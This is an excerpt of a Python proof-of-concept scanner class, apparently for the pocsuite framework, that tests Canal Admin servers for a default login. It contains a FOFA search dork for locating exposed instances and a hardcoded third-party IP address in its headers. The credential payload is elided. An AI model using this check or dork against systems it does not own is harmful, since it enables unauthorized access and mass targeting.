...
class CANALPOC(POCBase):
    ...
    references = ["https://fofa.info/result?qbase64=dGl0bGU9IkNhbmFsIEFkbWluIg%3D%3D"]  # 漏洞地址来源,0day不用写
    name = "Canal Admin 默认口令 PoC"  # PoC 名称
    appPowerLink = "https://fofa.info/result?qbase64=dGl0bGU9IkNhbmFsIEFkbWluIg%3D%3D"  # 漏洞厂商主页地址
    ...
    fofa_dork = "title=\"Canal Admin\"" # poc对应的产品类型 web的
    ...
    def _check(self):
        ...
        headers = {"Accept": "application/json, text/plain, */*",
                   ...
                   "Content-Type": "application/json;charset=UTF-8", "Origin": "http://121.37.139.144:8089",
                   "Referer": "http://121.37.139.144:8089/", "Accept-Encoding": "gzip, deflate",
        ...
        try:
            ...
            res = requests.post(url=url, headers=headers, json=payload, verify=False, timeout=9, allow_redirects=False)
            data_dict = res.json()
            # 判断是否存在漏洞
            if data_dict.get("code") == 20000 and data_dict.get("message") == None :
                print(data_dict.get("message"))
                result.append(url)
